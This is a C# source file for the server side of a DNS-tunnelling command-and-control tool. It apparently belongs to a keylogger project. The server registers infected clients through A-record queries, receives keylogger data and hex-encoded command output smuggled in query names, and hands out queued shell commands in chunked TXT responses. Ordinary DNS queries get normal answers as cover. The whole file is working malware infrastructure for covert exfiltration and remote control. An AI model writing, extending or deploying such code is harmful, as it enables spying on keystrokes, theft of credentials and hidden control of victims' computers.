using System.Net;
using System.Net.Sockets;
using Server.Models;
using Server.DNS;
using Server.Utilities;

namespace Server.Logic
{
    public class ServerLogic
    {
        private UdpClient? _udpServer;
        private bool _isRunning;
        private string _domain = "example.com";
        private string _serverIp = "127.0.0.1";
        
        private ClientManager? _clientManager;
        private ProtocolHandler? _protocolHandler;
        private AuthoritativeDNSHandler? _dnsHandler;
        private readonly Dictionary<int, Queue<string>> _commandQueues = new();
        private readonly Dictionary<int, (string fullCommand, int totalChunks, int currentChunk)> _commandChunkState = new();


        public event Action<string>? OnLogMessage;
        public event Action<ClientInfo>? OnClientAdded;
        public event Action<int>? OnClientRemoved;
        public event Action<int>? OnClientCountChanged;
        public event Action<int, string>? OnDataReceived;
        public event Action<int, string>? OnCommandResult;


        public void Start(int port, string domain, string logPath, string serverIp = "127.0.0.1")
        {
            if (_isRunning) return;

            _domain = domain.ToLower();
            _serverIp = serverIp;
            
            _clientManager = new ClientManager(logPath);
            _protocolHandler = new ProtocolHandler(_domain);
            _dnsHandler = new AuthoritativeDNSHandler(_domain, _serverIp);
            
            _clientManager.OnClientAdded += (info) => OnClientAdded?.Invoke(info);
            _clientManager.OnClientCountChanged += (count) => OnClientCountChanged?.Invoke(count);
            _protocolHandler.OnDataReceived += (id, data) =>
            {
                LogMessage("  => Decoded: '" + data + "'");
                OnDataReceived?.Invoke(id, data);
            };

            try
            {
                _udpServer = new UdpClient(port);
                _isRunning = true;

                LogMessage($"[Started] Authoritative DNS Server listening on port {port}");
                LogMessage($"[Domain] {_domain}");
                LogMessage($"[Server IP] {_serverIp}");
                LogMessage($"[Logs] {Path.GetFullPath(logPath)}");
                LogMessage("[MODE] LOCAL TEST - Direct client connections");
                LogMessage("  => Client connects directly to this server");
                LogMessage("  => No DNS Resolver needed");

                Task.Run(() => ListenForQueries());
            }
            catch (Exception ex)
            {
                LogMessage($"[Error] Failed to start: {ex.Message}");
            }
        }

        public void Stop()
        {
            if (!_isRunning) return;

            _isRunning = false;
            _udpServer?.Close();
            
            if (_clientManager != null)
            {
                _clientManager.SaveAllLogs(LogMessage);
            }
            
            LogMessage("[Stopped] Server stopped");
        }

        private async void ListenForQueries()
        {
            while (_isRunning && _udpServer != null)
            {
                try
                {
                    var result = await _udpServer.ReceiveAsync();
                    _ = Task.Run(() => ProcessQuery(result.Buffer, result.RemoteEndPoint));
                }
                catch (Exception ex)
                {
                    if (_isRunning)
                        LogMessage($"[Error] {ex.Message}");
                }
            }
        }

        private void ProcessQuery(byte[] data, IPEndPoint remoteEP)
        {
            if (_clientManager == null || _protocolHandler == null || _dnsHandler == null)
                return;

            try
            {
                var dnsQuery = DNSParser.ParseQuery(data);
                var queryName = dnsQuery.QueryName.ToLower();

                byte[] response;

                try
                {
                    string extractedData = _protocolHandler.GetData(queryName);
                    string[] parts = extractedData.Split('.', 2);
                    string packetType = parts[0];

                    // Type A: Connection initiation (QTYPE=1 A record)
                    if (packetType == "a" && dnsQuery.QueryType == 1)
                    {
                        LogMessage($"\n[Query] {queryName} from {remoteEP.Address}");
                        
                        // Check if client already exists by IP
                        int existingId = _clientManager.GetConnectionIdByIp(remoteEP.Address.ToString());
                        int connectionId;
                        
                        if (existingId > 0)
                        {
                            LogMessage($"[Connect] Client already exists with ID #{existingId}");
                            connectionId = existingId;
                        }
                        else
                        {
                            LogMessage($"[Connect] Starting connection #{_clientManager.ClientCount + 1}");
                            connectionId = _clientManager.AddClient(remoteEP.Address.ToString());
                            
                            // Initialize command queue for this connection
                            lock (_commandQueues)
                            {
                                if (!_commandQueues.ContainsKey(connectionId))
                                {
                                    _commandQueues[connectionId] = new Queue<string>();
                                }
                            }
                        }

                        string fakeIp = IPGenerator.CreateStartIp(connectionId - 1);
                        response = DNSResponseBuilder.CreateSimpleAResponse(data, dnsQuery, fakeIp);
                    }
                    // Type B: Keylogger data (QTYPE=1 A record)
                    else if (packetType == "b" && dnsQuery.QueryType == 1)
                    {
                        LogMessage($"\n[Query] {queryName} from {remoteEP.Address}");
                        string rest = parts.Length > 1 ? parts[1] : "";
                        
                        var metadata = _protocolHandler.ParseDataPacket(rest, _clientManager);
                        LogMessage($"[Data] Keylogger data from connection #{metadata.ConnectionId}");

                        string responseIp = IPGenerator.CreateResponseIp(ResponseCode.OK);
                        response = DNSResponseBuilder.CreateSimpleAResponse(data, dnsQuery, responseIp);
                    }
                    // Type C: Command result chunks (QTYPE=1 A record)
                    else if (packetType == "c" && dnsQuery.QueryType == 1)
                    {
                        LogMessage($"\n[Query] {queryName} from {remoteEP.Address}");
                        string rest = parts.Length > 1 ? parts[1] : "";
                        
                        LogMessage($"[Debug] Parsing Type C, rest: '{rest}'");
                        
                        // Parse: c.packetNumber.offset.connectionId.hexData.domain
                        // Need to extract domain first, then parse the rest
                        // Format: packetNumber.offset.connectionId.hexData.<domain parts>
                        string[] cParts = rest.Split('.');
                        LogMessage($"[Debug] Split into {cParts.Length} parts");
                        
                        if (cParts.Length < 4)
                        {
                            LogMessage($"[Error] Type C packet has only {cParts.Length} parts, need at least 4");
                            throw new DNSSyntaxException();
                        }

                        int packetNumber = int.Parse(cParts[0]);
                        int offset = int.Parse(cParts[1]);
                        int connectionId = int.Parse(cParts[2]);
                        
                        // HexData is everything between connectionId and domain
                        // Find where domain starts by counting dots from the end
                        int domainDots = _domain.Count(c => c == '.');
                        int hexDataEndIndex = cParts.Length - domainDots - 1;
                        
                        string hexData = cParts[3];
                        // If there are more parts before domain, it's part of hexData
                        if (hexDataEndIndex > 3)
                        {
                            for (int i = 4; i <= hexDataEndIndex; i++)
                            {
                                hexData += "." + cParts[i];
                            }
                        }
                        
                        LogMessage($"[Debug] Parsed - Packet: {packetNumber}, Offset: {offset}, ConnID: {connectionId}, HexLen: {hexData.Length}");

                        if (!_clientManager.ConnectionExists(connectionId))
                        {
                            throw new NXConnectionException();
                        }

                        LogMessage($"[Data] Command result chunk from connection #{connectionId} (packet #{packetNumber}, offset {offset})");
                        
                        // Parse hex data and add to parser
                        var parser = _clientManager.GetParser(connectionId);
                        if (parser != null)
                        {
                            byte[] decodedData = Convert.FromHexString(hexData);
                            parser.AddData(packetNumber, decodedData);
                            
                            string decodedText = System.Text.Encoding.UTF8.GetString(decodedData);
                            LogMessage($"  => Chunk data: '{decodedText}'");
                            
                            // Trigger event for command result (to update shell window)
                            OnCommandResult?.Invoke(connectionId, decodedText);
                        }

                        string responseIp = IPGenerator.CreateResponseIp(ResponseCode.OK);
                        response = DNSResponseBuilder.CreateSimpleAResponse(data, dnsQuery, responseIp);
                    }
                    // Type P: Poll for commands (QTYPE=16 TXT record)
                    else if (packetType == "p" && dnsQuery.QueryType == 16)
                    {
                        LogMessage($"\n[Query] {queryName} from {remoteEP.Address}");
                        LogMessage($"[Debug] Query type: {dnsQuery.QueryType}, Expected: 16 (TXT)");
                        string rest = parts.Length > 1 ? parts[1] : "";
                        LogMessage($"[Debug] Parsing rest: '{rest}'");
                        
                        // Parse: p.packetNumber.offset.connectionId.domain
                        string[] pParts = rest.Split('.');
                        LogMessage($"[Debug] Split into {pParts.Length} parts");
                        if (pParts.Length < 3)
                        {
                            LogMessage($"[Error] Not enough parts in Type P packet: {pParts.Length}");
                            throw new DNSSyntaxException();
                        }

                        int packetNumber = int.Parse(pParts[0]);
                        int offset = int.Parse(pParts[1]);
                        int connectionId = int.Parse(pParts[2]);

                        if (!_clientManager.ConnectionExists(connectionId))
                        {
                            throw new NXConnectionException();
                        }

                        LogMessage($"[Poll] Connection #{connectionId} polling for command (offset {offset})");

                        string commandChunk = "";
                        lock (_commandQueues)
                        {
                            LogMessage($"[Debug] Command queue exists: {_commandQueues.ContainsKey(connectionId)}");
                            if (_commandQueues.ContainsKey(connectionId))
                            {
                                LogMessage($"[Debug] Commands in queue: {_commandQueues[connectionId].Count}");
                            }
                            
                            if (_commandQueues.ContainsKey(connectionId) && _commandQueues[connectionId].Count > 0)
                            {
                                // Get or initialize chunk state
                                if (!_commandChunkState.ContainsKey(connectionId) || _commandChunkState[connectionId].currentChunk == 0)
                                {
                                    string fullCommand = _commandQueues[connectionId].Dequeue();
                                    int totalChunks = (int)Math.Ceiling(fullCommand.Length / 60.0);
                                    _commandChunkState[connectionId] = (fullCommand, totalChunks, 0);
                                    LogMessage($"  => Preparing to send command: '{fullCommand}' ({totalChunks} chunks)");
                                }

                                var state = _commandChunkState[connectionId];
                                int chunkStart = offset * 60;
                                
                                if (chunkStart < state.fullCommand.Length)
                                {
                                    int chunkLen = Math.Min(60, state.fullCommand.Length - chunkStart);
                                    string rawChunk = state.fullCommand.Substring(chunkStart, chunkLen);
                                    
                                    // Hex-encode the command chunk to preserve UTF-8 encoding
                                    byte[] chunkBytes = System.Text.Encoding.UTF8.GetBytes(rawChunk);
                                    commandChunk = Convert.ToHexString(chunkBytes).ToLower();
                                    
                                    _commandChunkState[connectionId] = (state.fullCommand, state.totalChunks, offset + 1);
                                    LogMessage($"  => Sending chunk {offset + 1}/{state.totalChunks}: '{rawChunk}'");
                                    LogMessage($"  => Hex encoded ({chunkBytes.Length} bytes): {commandChunk}");
                                }
                                else
                                {
                                    // All chunks sent, clear state
                                    _commandChunkState.Remove(connectionId);
                                    LogMessage($"  => All chunks sent, returning empty (end signal)");
                                }
                            }
                            else
                            {
                                LogMessage($"  => No commands queued");
                            }
                        }

                        response = DNSResponseBuilder.CreateTXTResponse(data, dnsQuery, commandChunk);
                    }
                    else
                    {
                        throw new UnrelatedException();
                    }
                }
                catch (ShortCircuitException)
                {
                    LogMessage("  └─> Short circuit: duplicate packet");
                    response = DNSResponseBuilder.CreateEmptyResponse(data, dnsQuery);
                }
                catch (UnrelatedException)
                {
                    LogMessage($"[Normal DNS Query] {queryName}");
                    response = _dnsHandler.HandleQuery(data, dnsQuery, queryName);
                }
                catch (DNSSyntaxException)
                {
                    LogMessage($"[Error] Improper syntax from {remoteEP.Address}");
                    string responseIp = IPGenerator.CreateResponseIp(ResponseCode.MALFORMED);
                    response = DNSResponseBuilder.CreateSimpleAResponse(data, dnsQuery, responseIp);
                }
                catch (ServerMaxConnectionsException)
                {
                    LogMessage($"[Error] Max connections reached from {remoteEP.Address}");
                    string responseIp = IPGenerator.CreateResponseIp(ResponseCode.MAX);
                    response = DNSResponseBuilder.CreateSimpleAResponse(data, dnsQuery, responseIp);
                }
                catch (NXConnectionException)
                {
                    LogMessage($"[Error] Connection does not exist from {remoteEP.Address}");
                    string responseIp = IPGenerator.CreateResponseIp(ResponseCode.NX);
                    response = DNSResponseBuilder.CreateSimpleAResponse(data, dnsQuery, responseIp);
                }
                catch (PacketsOutOfOrderException)
                {
                    LogMessage($"[Error] Out of order packets from {remoteEP.Address}");
                    string responseIp = IPGenerator.CreateResponseIp(ResponseCode.OOO);
                    response = DNSResponseBuilder.CreateSimpleAResponse(data, dnsQuery, responseIp);
                }
                catch (Exception ex)
                {
                    LogMessage($"[Exception] {ex.Message} from {remoteEP.Address}");
                    response = DNSResponseBuilder.CreateEmptyResponse(data, dnsQuery);
                }

                _udpServer?.Send(response, response.Length, remoteEP);
            }
            catch (Exception ex)
            {
                LogMessage($"[Error] Processing query: {ex.Message}");
            }
        }

        public void EnqueueCommand(int connectionId, string command)
        {
            lock (_commandQueues)
            {
                LogMessage($"[Debug] EnqueueCommand called for connection #{connectionId}");
                LogMessage($"[Debug] Command queues count: {_commandQueues.Count}");
                LogMessage($"[Debug] Queue exists for #{connectionId}: {_commandQueues.ContainsKey(connectionId)}");
                
                if (_commandQueues.ContainsKey(connectionId))
                {
                    _commandQueues[connectionId].Enqueue(command);
                    LogMessage($"[Command] ✅ Queued for connection #{connectionId}: '{command}'");
                    LogMessage($"[Debug] Queue now has {_commandQueues[connectionId].Count} command(s)");
                }
                else
                {
                    LogMessage($"[Command] ❌ ERROR: No command queue exists for connection #{connectionId}");
                    LogMessage($"[Debug] Available connection IDs: {string.Join(", ", _commandQueues.Keys)}");
                }
            }
        }

        private void LogMessage(string message)
        {
            OnLogMessage?.Invoke(message);
        }
    }
}
